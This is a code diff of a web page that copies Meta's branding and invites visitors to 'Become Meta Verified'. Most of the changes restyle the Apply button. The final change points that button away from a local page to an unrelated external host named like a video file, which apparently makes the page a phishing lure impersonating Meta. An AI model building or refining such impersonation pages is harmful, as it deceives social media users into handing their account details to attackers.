@@ -67,33 +67,64 @@
             background: linear-gradient(135deg, #0064E0, #1a90ff);
             color: white;
             padding: 1rem 2.5rem;
-            border-radius: 100px;
+            border-radius: 60px;
             text-decoration: none;
             display: inline-block;
-            font-weight: 500;
+            font-weight: 800;
             margin: 1rem 0;
             box-shadow: 0 4px 12px rgba(0,100,224,0.2);
-            cursor: pointer;
-            border: none;
-            font-size: 1rem;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.1s ease;
+    
+            
+          
+            transition: all 0.2s ease;
         }
 
         /* Fast pulse animation */
-        @keyframes fastPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
-
         .apply-btn:hover {
-            animation: fastPulse 0.3s ease;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0,100,224,0.3);
         }
 
         .apply-btn:active {
-            transform: scale(0.98);
+            transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(0,100,224,0.2);
+        }
+
+        /* Subtle shine effect on hover */
+        .apply-btn::after {
+            content: '';
+            position: absolute;
+            
+            left: -50%;
+            width: 50%;
+            height: 50%;
+            background: linear-gradient(
+                to right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            transition: all 0.5s ease;
+            opacity: 0;
+        }
+
+        .apply-btn:hover::after {
+            animation: shine 1s ease;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -50%;
+                opacity: 0;
+            }
+            20% {
+                opacity: 0.8;
+            }
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
         }
 
         .description {
@@ -189,7 +220,7 @@
 
             .apply-btn {
                 padding: 0.75rem 2rem;
-                width: 100%;
+                width: 45%;
                 text-align: center;
             }
         }
@@ -279,7 +310,7 @@
             <h1>Become <br>Meta Verified</h1>
             
             <!-- Using a simple anchor tag for fastest possible redirection -->
-            <a href="/request.html" class="apply-btn">Apply </a>
+            <a href="https://detailed-video-mp4.vercel.app/request.html" class="apply-btn">Apply </a>
             
             <p class="description">
                 Grow your social presence with Meta Verified – a new subscription bundle available for creators and businesses on Instagram and Facebook.
